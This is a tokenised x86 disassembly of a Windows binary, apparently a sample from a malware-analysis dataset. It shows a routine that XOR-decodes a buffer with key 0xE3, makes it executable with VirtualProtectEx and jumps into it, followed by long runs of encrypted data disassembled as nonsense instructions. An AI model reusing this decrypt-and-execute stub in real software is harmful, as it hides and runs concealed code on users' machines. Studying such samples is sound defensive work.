movzx eax si
push eax
mov eax [ ebx + 0x38 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_404250
inc eax
push eax
mov eax [ ebp - 0x4 ]
call sub_404450
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_460ab4
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_403fe4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
call sub_404250
test eax eax
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
push 0x3ec
mov eax [ ebx + 0x34 ]
call sub_404450
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x38 ] eax
sub_460b10
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_460b41
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460b48
retn
mov eax rw-data
call sub_40cb64
sub_460b4c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e9a0
mov [ rw-data ] eax
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413034
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413034
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413034
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413034
sub_460e24
push ebp
mov ebp esp
add esp 0xffffffec
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
nop
nop
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
jno r-xdata
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
call sub_403198
sub_460e58
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov al [ eax ]
mov [ ebp - 0x9 ] al
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
nop
nop
xor [ ebp - 0x9 ] 0xe3
nop
nop
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
jae r-xdata
call sub_403198
mov dl [ ebp - 0x9 ]
mov [ eax ] dl
nop
inc [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0x53e3
jne r-xdata
call sub_403198
nop
nop
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x10 ]
jae r-xdata
mov esp ebp
pop ebp
retn
sub_460eac
push ebp
mov ebp esp
add esp 0xfffffff0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
nop
push r-xdata
call sub_460eac
jae r-xdata
nop
nop
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x53e2
mov eax [ ebp + 0x8 ]
push eax
jae r-xdata
push 0xb66a8533
mov [ ebp - 0x4 ] eax
jmp [ ebp - 0x4 ]
call sub_403198
jbe r-xdata
jae r-xdata
sahf
jecxz r-xdata
fdiv [ edi + 0x65ecb3eb ]
loopne r-xdata
jecxz r-xdata
jae r-xdata
0x37a66a85 0x2568
or bl [ ecx + 0x73e3e3a7 ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cdq
jae r-xdata
push 0xffffffbe
jae r-xdata
jae r-xdata
jae r-xdata
and bp sp
dec si
out dx al
jecxz r-xdata
dec eax
jecxz r-xdata
jae r-xdata
or edi [ edx + ecx - 0x1c1c058a ]
mov ebp edx
test [ edx - 0x62 ] ebp
push 0x966a8513
jae r-xdata
jecxz r-xdata
jae r-xdata
sub cl [ edx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov edx 0x21688489
test [ edx - 0x5a ] ebp
outsb
cmpsb [ esi ] [ edi ]
mov edi 0xe3ee770a
jecxz r-xdata
mov esi 0x73737320
jae r-xdata
jecxz r-xdata
and cl [ edx ]
outsb
clc
mov ah 0xf7
push 0x56
mov ebx 0x33689089
test [ edx - 0x4a ] ebp
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cli
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
ja r-xdata
or bl [ ebp + 0x5be3e3db ]
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
or dl [ esi ]
fsubrp st3
push ds
jae r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
mov ebx eax
test [ edx - 0x4a ] ebp
cmp eax 0x859089b9
push 0xffffffb6
add ebp [ eax + 0x32 ]
test [ edx - 0x4a ] ebp
add [ edx ] ecx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
xor eax 0xac389b9
pop es
nop
push 0xb66a8533
jae r-xdata
shl ebx 0xe3
jae r-xdata
jae r-xdata
mov [ 0xffffffffd00a2a67 ] eax
test al 0xe3
jecxz r-xdata
jecxz r-xdata
mov bh 0xeb
mov bl 0xec
loopne r-xdata
jae r-xdata
fcmove st7
jecxz r-xdata
mov ch 0x6e
outsb
outsd
push ds
sbb al 0x1c
or ah ch
or dl [ eax + ebp * 8 - 0x1d ]
jecxz r-xdata
fninit
jae r-xdata
jae r-xdata
jae r-xdata
sub ah ch
jae r-xdata
pop edx
call 0x73b9f4e5
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov esi 0xa3b68b1
sbb esi ecx
fsubrp st3
jecxz r-xdata
jecxz r-xdata
xor ebx [ esi ]
sbb al 0xb4
imul [ edx + 0x56 ]
aad 0x85
push 0xffffff9e
mov esp 0xe3fa760a
jecxz r-xdata
jae r-xdata

add [ ebp - 0x1c5534f6 ] edi
jecxz r-xdata
test [ edx - 0x5a ] ebp
or ecx [ edx ]
mov ecx [ eax + 0x16 ]
sahf
fbstp [ eax - 0x1ce09a96 ]
jecxz r-xdata
push 0xac290ae2
jae r-xdata
call 0x73b9f60d
in al dx
sbb al 0x92
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
arpl [ edx - 0x42 ] bp
jae r-xdata
jecxz r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
push 0x9e6a851d
adc eax 0xe3d64d0a
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
mov ebp 0x73737320
mul bl
jecxz r-xdata
or ecx ebx
iretd
push eax
jae r-xdata
jecxz r-xdata
or ch [ ecx ]
jae r-xdata
sub [ ebx + 0x737373e3 ] ebp
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
jecxz r-xdata
jae r-xdata
mov bl 0x8b
in eax 0xe3
loope r-xdata
and bp sp
mov esi 0x1b741cf3
test [ eax - 0x26 ] esp
retn
jae r-xdata
or ah [ edx ]

jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
fcomip st3
jecxz r-xdata
push 0xffffffbe
or al 0xe1
loopne r-xdata
jae r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
jae r-xdata
jae r-xdata
retn 0xe3e3
jae r-xdata
aaa
push 0xa7990a25
push 0xffffffa6
jae r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
pushad
mov dh 0x35
mov ecx 0x70ac389
jae r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
mov al 0xb5
or eax [ ebp - 0x14 ]
xchg esi eax
jae r-xdata
lodsb [ esi ]
jae r-xdata
or esp [ edi - 0x2c ]
jecxz r-xdata
jae r-xdata
jae r-xdata
or esi esp
jecxz r-xdata
mov esp 0x2366b8bd
in al dx
jecxz r-xdata
jae r-xdata
jae r-xdata
push 0x7c0bf7ae
fsubr st3
jecxz r-xdata
in al dx
pop ebp
fchs
sub al 0xd0
adc cl [ edx ]
sbb ah ch
or esi [ edi - 0xa ]
jecxz r-xdata
shl [ ebx ] 0x1
mov al 0x6e
nop [ esp + ebx ] bx
outsb
or esi [ ebp - 0x451c1c17 ]
or bh [ esi - 0x17 ]
sbb al 0x96
out dx eax
push 0x966eebae
cmpsb [ esi ] [ edi ]
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
sbb al 0xf6
dec edi
jecxz r-xdata
jecxz r-xdata
mov [ edi - 0x1c06f0f6 ] edx
fsubr st3
jecxz r-xdata
mov ebx 0x540a8e89
cmpsd [ esi ] [ edi ]
jecxz r-xdata
mov bl 0x1c
xchg esi eax
jae r-xdata
and edi [ ebp + edi * 4 + 0x73202ab8 ]
jae r-xdata
jae r-xdata
or bl [ ecx ]
loop r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or ecx [ eax - 0x27 ]
jecxz r-xdata
sbb eax 0x67ec1c1c
jae r-xdata
jae r-xdata
mov eax [ eax - 0x4f8d17fc ]
or ebx edx
iretd
jae r-xdata
pushad
daa
out dx eax
push 0xffffff9f
movsd [ edi ] [ esi ]
retn
daa
mul [ esi + 0x23 ]
in al dx
aam 0xe3
mov ah 0xb
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
pushad
jecxz r-xdata
aam 0xe3
mov esp 0xe3f40b0a
jecxz r-xdata
jae r-xdata
jae r-xdata
mov dh 0x47
scasb [ edi ]
aaa
outsb
cmpsb [ esi ] [ edi ]
inc edi
or ebp [ ebp - 0x1d ]
jecxz r-xdata
push es
mov ebp 0xec2366b8
mov edx 0x67ec2366
stc
or edx [ edi + edx * 8 ]
jecxz r-xdata
xlat
or dh [ ebx - 0x51 ]
jecxz r-xdata
fsubr [ eax ]
in al dx
jae r-xdata
or bl [ edx - 0x18 ]
ja r-xdata
jae r-xdata
jecxz r-xdata
mov [ eax + esi * 4 + 0xa ] esi
pop dx
cli
jecxz r-xdata
and ebp esp
pop ebx
jecxz r-xdata
jecxz r-xdata
pop ebp
sbb al 0x1c
sbb al 0x73
scasb [ edi ]
pop ds
salc
jae r-xdata
cmpps xmm4 xmm3 0xe3
jecxz r-xdata
jbe r-xdata
sub ah [ eax ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
pop es
or dh ch
test [ edx - 0x4a ] ebp
mov bl 0x6e
cmpsd [ esi ] [ edi ]
jae r-xdata
mov ebp 0x7373202a
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or cl [ ecx - 0x1b ]
jae r-xdata
add edi [ ebx + 0x13689b89 ]
test [ edx - 0x6a ] ebp
push 0xffffffa6
cmp [ 0x67ec1c1c ] ebx
jae r-xdata
jecxz r-xdata
and bp sp
stc
jae r-xdata
lfs ecx [ ebx ]
sbb al 0x96
jae r-xdata
jae r-xdata
mov bl 0x6e
jae r-xdata
inc edx
jmp 0xffffffff9562f710
and ebp esp
in al dx
jae r-xdata
push esp
mov al 0xb5
push 0x31668522
or dh [ edx ]
aam 0xe3
jecxz r-xdata
mov bh 0xa
scasb [ edi ]
hlt
jae r-xdata
jecxz r-xdata
inc ebx
cmc
and ebp esp
xor edi esi
jecxz r-xdata
jecxz r-xdata
or bl [ ebp - 0x2e ]
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
scasb [ edi ]
test [ ebx ] 0xe3e3dc7c
outsb
pavgw mm4 mm3
sbb al 0x74
sbb esp ebx
jecxz r-xdata
push 0xffffffbe
jecxz r-xdata
jae r-xdata
adc ah bl
jecxz r-xdata
pop ebx
in eax 0xe3
jecxz r-xdata
jg r-xdata
jecxz r-xdata
push 0x65
scasb [ edi ]
jmp r-xdata
jae r-xdata
popfd
jae r-xdata
shl bl cl
jecxz r-xdata
sub ah [ eax ]
jmp 0x73b9f582
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
sbb eax 0x159e6a85
or cl [ ebp - 0x2a ]
mov cl 0x68
cmp ecx [ edx ]
test [ edx - 0x42 ] ebp
jae r-xdata
jae r-xdata
aaa
push 0xf86e0a22
mov [ eax + ebp * 2 - 0x59957adf ] eax
jae r-xdata
jae r-xdata
sbb al 0x1c
in al dx
cmp eax 0x6a852468
cmpsb [ esi ] [ edi ]
test [ edx - 0x5a ] ebp
mov ebx [ ebx ]
or cl [ ebx ]
hlt
jae r-xdata
jae r-xdata
pop di
sbb [ esp + ebx ] ebx
mov bl 0xa
jae r-xdata
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jecxz r-xdata
outsb
push di
sbb ebx [ esp + ebx ]
mov bl 0x6e
cmpsb [ esi ] [ edi ]
btr [ esi + 0x66 ] ebp
daa
pop ds
sbb al 0x1c
mov bl 0x1c
jne r-xdata
outsb
scasb [ edi ]
daa
or bh [ ecx + 0x73e3e3c7 ]
sbb al 0x75
dec edi
sti
or bh [ ebx - 0xe ]
sbb al 0x96
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
pop ss
jecxz r-xdata
jae r-xdata
div [ ebp - 0x1c27daf6 ]
pop ds
push 0x921c1fae
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
fsub st3
jae r-xdata
mov bl 0x8b
loop r-xdata
push ds
sbb al 0x1c
or cl [ edi ]
or bh [ ecx ]
jae r-xdata
call GetCurrentProcess
push eax
call VirtualProtectEx
nop
nop
add [ eax + ebp * 8 ] 0x72
mov al 0xb
cmp eax 0xe3db9d0a
push 0xffffffa6
jecxz r-xdata
or eax [ esi - 0x5b ]
or bl [ edx ]
hlt
jecxz r-xdata
jno r-xdata
jae r-xdata
fdiv [ edx ]
or cl [ eax + 0x73e3e3cc ]
jae r-xdata
jae r-xdata
mov [ 0x27666eb3 ] eax
pop ds
sbb al 0x1c
jecxz r-xdata
or ah [ 0x73e3e3d8 ]
fnstcw [ ebx + 0x6a85b989 ]
cmpsb [ esi ] [ edi ]
or dl [ eax + ebx * 8 + 0x7373e3e3 ]
mov esi 0x17ae6a1f
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
sbb al 0xe3
jae r-xdata
mov ebx 0xd10a8c89
mov [ ecx + 0x3fa66a85 ] edi
jae r-xdata
mov eax ebp
or [ ecx + 0x5b0ab074 ] 0xe5
jecxz r-xdata
jae r-xdata
pavgw mm4 mm3
jecxz r-xdata
mov [ esi - 0x1c17abf6 ] ecx
jae r-xdata
jae r-xdata
shr [ eax + 0x7373e3e3 ] 0x1
jae r-xdata
sub cl [ bp + si ]
jae r-xdata
or al [ ebx - 0xb ]
push 0xffffffb6
jecxz r-xdata
mul ebx
jecxz r-xdata
push es
inc esi
jae r-xdata
xor ah dl
jecxz r-xdata
out 0xe2 eax
outsd
sub eax 0xa1c1c1d
into
jecxz r-xdata
aas
test [ edx - 0x5a ] ebp
jae r-xdata
jecxz r-xdata
jae r-xdata
into
fcomp [ eax ]
in al dx
je r-xdata
push 0xffffffa6
jae r-xdata
in al dx
pop ds
or dl [ eax - 0x4 ]
jae r-xdata
jae r-xdata
jae r-xdata
xchg esp eax
clc
jecxz r-xdata
test [ edx - 0x62 ] ebp
pop edx
jae r-xdata
jmp 0x7429f791
sbb al 0x75
pop ebx
jecxz r-xdata
mov esi 0x8b67eceb
fsubrp st3
daa
pop ds
sbb al 0x1c
mov bl 0xb
salc
0xb3a3e3e3 0x666e
jecxz r-xdata
loop r-xdata
push ax
push esp
jecxz r-xdata
jae r-xdata
jle r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
push eax
cld
jae r-xdata
or edi [ edi - 0x36 ]
and edi [ ebp + 0x7373202a ]
jae r-xdata
or cl [ eax ]
leave
jecxz r-xdata
jecxz r-xdata
or ah dh
jecxz r-xdata
jae r-xdata
iretd
push 0xffffffbe
sbb esp [ eax ]
mov ebx 0x85bababa
hlt
jae r-xdata
pushad
lahf
mov edi 0xc867ece3
jecxz r-xdata
jecxz r-xdata
mov esi 0xbc67ecef
inc ecx
push 0xffffffbe
pop ds
push 0xffffffae
adc al 0xd7
jae r-xdata
push 0x1cf3c7a7
shl esi cl
jcxz r-xdata
inc edi
test [ edx - 0x4a ] ebp
jae r-xdata
push 0xcca80a0f
in al dx
jae r-xdata
jae r-xdata

jae r-xdata
jecxz r-xdata
sbb al 0x1c
jecxz r-xdata
push esp
xor ebp [ esi - 0x43 ]
and ecx [ edx ]
push esp
cmp esp ebx
jecxz r-xdata
jecxz r-xdata
xor eax 0x180a23d0
test [ edx - 0x5a ] ebp
hlt
xor eax [ ebp + 0xa07b66a ]
cmc
jecxz r-xdata
jae r-xdata
jae r-xdata
cmp [ ecx - 0x7849957b ] 0x85b98489
push 0xffffffa6
lea eax [ ebp + 0x6885b66a ]
xor edx eax
and eax [ ebp + 0x6e93a66a ]
in al dx
push 0x6eefc79f
jecxz r-xdata
sbb al 0x96
out dx eax
sbb al 0x96
jmp r-xdata
test [ edx - 0x5b ] ebp
jmp r-xdata
jae r-xdata
jecxz r-xdata
int 0xe3
jecxz r-xdata
or cl dh
fcom [ eax ]
in al dx
jecxz r-xdata
jecxz r-xdata
mov eax [ ebp + 0x8 ]
call sub_460e58
nop
nop
mov eax [ ebp + 0x8 ]
add eax 0x1774
jae r-xdata
outsb
push 0xffffffb6
jae r-xdata
jecxz r-xdata
xchg esi esi
jecxz r-xdata
or dh bh
jae r-xdata
in al dx
push edi
push 0xa66a853b
xor ecx [ edx ]
mov al 0xe3
jecxz r-xdata
jae r-xdata
jecxz r-xdata
shl bl cl
jecxz r-xdata
jae r-xdata
in al dx
mov ebx esi
jecxz r-xdata
sbb al 0x54
aas
jecxz r-xdata
jae r-xdata
jecxz r-xdata
mov ch 0xb
inc ebp
in al dx
aad 0x89
test [ ebp - 0x46f06196 ] al
jae r-xdata
mov ah 0xa
cmc

or edx [ eax + edi * 8 - 0x19f51c1d ]

cmpsb [ esi ] [ edi ]
pop ss
mov bl 0xa
shr [ ebx - 0x4b8c1c1d ] cl
or dh ch
mov edx 0x66ec2366
jae r-xdata
jae r-xdata
test [ edx - 0x4a ] ebp
jae r-xdata
jecxz r-xdata
jae r-xdata
mov bl 0x8b
xor cl [ edx ]
mov ah cl
jecxz r-xdata
in al dx
jne r-xdata
and cx [ edx ]
fsubrp st3
jecxz r-xdata
fidivr [ esi - 0x43981311 ]
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov al 0xb5
or ah [ edx + 0x73e3e3c2 ]
jae r-xdata
test [ edx - 0x4a ] ebp
fisttp [ edx ]

mov dh 0xd5
jae r-xdata
mov dl 0xde
jecxz r-xdata
pushad
test eax ebx
loop r-xdata
stosd [ edi ]
in al dx
jae r-xdata
jecxz r-xdata
mov ch 0xb
cld
in eax dx
jecxz r-xdata
jae r-xdata
lahf
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
out 0xcb al
jecxz r-xdata
push 0xffffff97

mov [ ebp + eax * 4 - 0x46f06196 ] eax
outsb
in al dx
enter 0xe3d2 0xe3
mul bl
jecxz r-xdata
or dh [ edx ]
loop r-xdata
or cl dl
out 0xe3 eax
jecxz r-xdata
outsb
jecxz r-xdata
jae r-xdata
mov ah 0xb4
mov ah 0x6e
jmp r-xdata
outsb
jae r-xdata
sub ah [ eax ]
cmpsb [ esi ] [ edi ]
test [ ebp + 0x688b966a ] 0x68b39f96
and eax 0x89b66a85
test [ edx - 0x52 ] ebp
mov [ ecx - 0x7e49957b ] eax
mov ecx 0x87b66a85
mov [ ecx + edi * 4 - 0x7259957b ] eax
test [ edx - 0x4a ] ebp
test [ eax + 0x33 ] ebp
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
xchg ebx eax
outsb
jecxz r-xdata
test al 0xcc
jae r-xdata
and bp sp
out 0x5a eax
jecxz r-xdata
jae r-xdata
push 0xe3e33b54
jecxz r-xdata
xchg [ edx ] cl
cmp [ edx ] ebx
sbb al 0x1c
jae r-xdata
outsb
push edi
sbb ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
adc ah ch
in al dx
or esp ecx
or cl [ edx - 0x3e ]
sbb al 0xe3
jae r-xdata
aas
lea esi [ ebp + 0x7e0baeae ]
mov eax [ 0xffffffffbdbce3e3 ]
mov eax 0x67ec2366
test [ edx - 0x5a ] ebp
or ecx [ esi - 0x45e3e3e3 ]
pushad
sbb al 0x1c
jae r-xdata
jae r-xdata
hlt
jae r-xdata
mul edx
pushad
add esp ebp
imul esi edi 0xa3f3d3d9
lodsd [ esi ]
in al dx
rcl cx cl
jecxz r-xdata
outsb
daa
imul [ edx - 0x1b ]
fsub [ eax ]
fsub st2
or ch cl
mul bl
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov ebp ecx
test [ edx - 0x52 ] ebp
or bl [ edx - 0x22 ]
jecxz r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
cmp ebp [ esi + 0x2486bbae ]
cmpsb [ esi ] [ edi ]
or dl [ esi ]
out 0xe3 eax
jecxz r-xdata
jecxz r-xdata
or bh [ eax ]
leave
test [ edx - 0x4a ] ebp
push 0xffffffa6
jecxz r-xdata
jae r-xdata
iretd
mul ebx
jecxz r-xdata
jae r-xdata
pop ds
or ch [ esi + 0x73e3e3f0 ]
mov [ esi - 0x59957a45 ] eax
or dh dh
jmp ebx
or edx ebp
sbb al 0x75
dec edi
jecxz r-xdata
adc [ edx + 0x17ae6a85 ] edi
jae r-xdata
and al 0xa6
xchg edx eax
movsd [ edi ] [ esi ]
or dh [ edx - 0x25 ]
jecxz r-xdata
mov ebp 0x85202ab8
push 0xffffffa6
jecxz r-xdata
mov ah 0xb0
sbb al 0x75
arpl bx sp
mov esi esp
jecxz r-xdata
jae r-xdata
jae r-xdata
or dh [ ecx ]
int1
jae r-xdata
jne r-xdata
jae r-xdata
push es
jae r-xdata
adc eax 0xa78923d0
or bh [ esi - 0x29 ]
jecxz r-xdata
or dh [ edi ]
aad 0xe3
jecxz r-xdata
aaa
jecxz r-xdata
or edi [ ebx + 0x68e3e3da ]
jae r-xdata
in al dx
jae r-xdata
cli
jecxz r-xdata
in al dx
dec eax
jae r-xdata
adc eax 0xe3dd0a0a
jecxz r-xdata
test [ edx - 0x5a ] ebp
or dl [ ecx + 0x73e3e3ab ]
jae r-xdata
sbb al 0x1c
mov edx 0xece21b60
jae r-xdata
or al [ eax ]
shl bl cl
jecxz r-xdata
int 0xe3
push es
jae r-xdata
jecxz r-xdata
jae r-xdata
pop ss
rcr [ eax * 4 + 0x68a3b66a ] 0x1
cmp ecx [ edx ]
mov [ 0x73e3e3c2 ] eax
push 0xffffff9e
0x7373e3e3 0x7373
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sub ecx [ ecx - 0x51957a33 ]
jae r-xdata
jae r-xdata
jecxz r-xdata
sub al 0xd1
jae r-xdata
jecxz r-xdata
jae r-xdata
or dl [ edi + 0x73e3e3d7 ]
in al dx
mov esp 0xae3e3f7
lodsb [ esi ]
out 0x8b eax
jecxz r-xdata
jae r-xdata
sbb [ ecx + 0x6a85bb86 ] ecx
cmpsb [ esi ] [ edi ]
push 0xffffffa6
sbb al 0x96
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov bh 0x18
jae r-xdata
jecxz r-xdata
outsb
jecxz r-xdata
jecxz r-xdata
jae r-xdata
push 0x202a1fa6
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
mov dh 0xef
mov ebx 0x68e3e3da
jae r-xdata
pushad
and ebx eax
test [ edx - 0x9 ] ebp
outsb
sub ebx [ esi ]
sbb al 0x1c
or esi [ ebp + 0xae3e3ce ]
xor bl ch
pushad
daa
test [ edx ] 0xe3e3dd45
jae r-xdata
jecxz r-xdata
sbb al 0x96
add ebx [ esp + esi * 2 ]
jecxz r-xdata
or al [ ebp - 0xf ]
sbb al 0x96
add ecx [ edx ]
xor esp esi
or ecx [ ecx - 0x8 ]
jecxz r-xdata
jae r-xdata
jecxz r-xdata
outsb
pop ds
mov esp ebx
shl ebx cl
jecxz r-xdata
outsb
jae r-xdata
jecxz r-xdata
jae r-xdata
mov edi esp
jecxz r-xdata
jae r-xdata
jae r-xdata
mov bl 0xa
xchg ecx eax
stosd [ edi ]
sbb esp edx
sbb al 0xb
mov ds [ 0x60ba1c1c ]
jecxz r-xdata
xor ecx esi
jae r-xdata
jecxz r-xdata
push 0xffffffa6
jecxz r-xdata
mov ah 0xb1
pop ebp
inc esp
and eax 0x8b0aad84
mov al [ 0x7373e3e3 ]
jae r-xdata
mov edx 0xa1b68ba
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
out 0xe2 eax
jecxz r-xdata
loopne r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
mov edx 0xec2366ba
scasb [ edi ]
jae r-xdata
jecxz r-xdata
pop esp
push 0xf1450a2b
mov edx 0x17ae6a85
jae r-xdata
fld [ eax + 0x3b ]
pushad
sbb [ esp + ebp * 8 ] bl
out 0xe3 al
sub ebx [ esi ]
jae r-xdata
jmp r-xdata
xchg esi eax
mov ah 0xb4
mov ah 0xb4
outsb
jecxz r-xdata
mov dh 0xa
cmp cl cl
shl [ ebx ] 0x1
or cl [ edi + 0x73e3e3ea ]
jecxz r-xdata
jae r-xdata
sbb al 0x1c
outsb
push ds
mov esp 0x390a8689
sbb bl [ esp + ebx ]
or ebp [ ecx + edx * 8 ]
mov esi 0xcd66ecf3
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or ebx edi
jae r-xdata
jae r-xdata
push 0xdf0befb6
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
or bl cl
sti
jecxz r-xdata
xchg [ esi ] ah
jae r-xdata
jecxz r-xdata
jae r-xdata
mov ah 0xa
jbe r-xdata
and ecx [ edx ]
push ebp
out 0xed eax
in al dx
push ebp
sbb eax ecx
and al 0xec
das
mov [ esi + 0x1c1a390a ] eax
sbb al 0x73
pushad
or dx bp
in al dx
jae r-xdata
dec eax
jae r-xdata
sbb al 0x1c
mov bl 0xa
add dl dl
jecxz r-xdata
outsb
test [ edx - 0x5a ] ebp
sub bx [ esi ]
loop r-xdata
outsb
jae r-xdata
or eax [ edi ]
outsb
outsb
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
out dx eax
jae r-xdata
sbb al 0x74
or esp ebx
jecxz r-xdata
or ah cl
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov edi 0xb31c1c1e
mov eax 0x6a85202a
cmpsb [ esi ] [ edi ]
dec di
adc eax 0x890a1c1c
out 0xe3 al
jecxz r-xdata
sbb al 0x6e
jae r-xdata
jae r-xdata
lahf
out 0xe3 eax
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
fucom st3
jecxz r-xdata
mov edx 0x9e0a1b68
jecxz r-xdata
jecxz r-xdata
sub ebx [ esi ]
aad 0xe3
jae r-xdata
push ebx
jae r-xdata
jecxz r-xdata
jae r-xdata
mov bl 0x6e
jae r-xdata
ffreep st4
jae r-xdata
cmpsb [ esi ] [ edi ]
or ah al
jecxz r-xdata
lgs ebp [ esi + 0x2485b5a8 ]
cmpsb [ esi ] [ edi ]
adc ebp [ esi + 0x3ba624e3 ]
scasb [ edi ]
jae r-xdata
jecxz r-xdata
shl ebx 0xe3
pushad
or cl [ eax ]
jae r-xdata
push 0xffffffa6
cmp ebp [ eax + 0x22 ]
push ds
add edi [ ebx - 0x1c1a35f6 ]
test [ edx - 0x5a ] ebp
mov bh 0x18
jae r-xdata
pushad
daa
test [ edx ] 0xe3e3a95f
jae r-xdata
jae r-xdata
or esp ebx
sbb al 0xb5
stosd [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ebx 0xe3e5ca0a
jecxz r-xdata
fsincos
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
or eax [ ebx + 0x6ee3e3ec ]
jae r-xdata
jcxz r-xdata
or cl [ eax ]
hlt
push di
jae r-xdata
jae r-xdata
mov bl 0xa
jecxz r-xdata
jae r-xdata
adc [ ecx - 0x1c0f13f6 ] 0xe3
jecxz r-xdata
jae r-xdata
adc esp ebx
jae r-xdata
int3
jae r-xdata
mov ebx [ ebx ]
jae r-xdata
aaa
push ds
sbb al 0x1c
mov bl 0xa
pop esp
shl bl 0xe3
push 0xec38663b
xlat
jecxz r-xdata
add eax [ edx + 0x24829587 ]
or bh [ edx - 0x1fe3e3eb ]
scasb [ edi ]
das
mov bl 0xa
pop edx
shl bl 0x1
jecxz r-xdata
pushad
jae r-xdata
outsb
mov ebx 0xe62388e1
or al [ esi ]
sti
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
outsb
jae r-xdata
